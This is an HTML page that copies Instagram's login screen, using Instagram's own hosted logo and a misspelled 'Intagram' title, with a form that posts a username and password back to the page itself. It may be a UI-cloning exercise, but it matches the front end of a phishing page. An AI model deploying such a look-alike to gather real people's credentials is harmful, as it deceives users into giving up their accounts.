<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Intagram</title>
    <link rel="stylesheet" href="style.css">
    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>

</head>
<body>
    
    <div class="main-container">
            <!-- ------Logo------ -->
            <div aria-disabled="false" role="button" tabindex="0" class ="logo"><i data-visualcompletion="css-img" aria-label="Instagram" class="" role="img" style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v3/yS/r/ajlEU-wEDyo.png&quot;); background-position: 0px -52px; background-size: auto; width: 175px; height: 51px; background-repeat: no-repeat; display: inline-block;"></i></div>
           


            <!-- ------Form------ -->
            <div class="form-container">
                <form  method="POST">
                    <div class = "input-box">
                        <input type="text" name="username" placeholder="Phone number, username or email address" required>
                        <input type="password" name="password" placeholder="Password" required>
                        <button type="submit" name="submit">Log In</button>
                    </div>
                </form>
            </div>
           
            <!-- ------Or------ -->
            <div class="or">
                
                <div class="line"></div>
                <div class="or-text">OR</div>
                <div class="line"></div>
            </div>

            

            <!-- ------Facebook Login------ -->
            <div class="login-facebook">
                <i class='bx bxl-facebook-square'></i>
                <a href = " ">  Log in with Facebook</a>
            </div>

            <!-- ------Forget password------ -->
            <div class="forget">
                <a>Forgotten your password ?</a>
            </div>
    </div>


    <!-- ------Footer------ -->

    <div class = "footer">
        <h2>Don't have an account?</h2>
        <a href = "#">Sign up</a>
    </div>
    
</body>
</html>
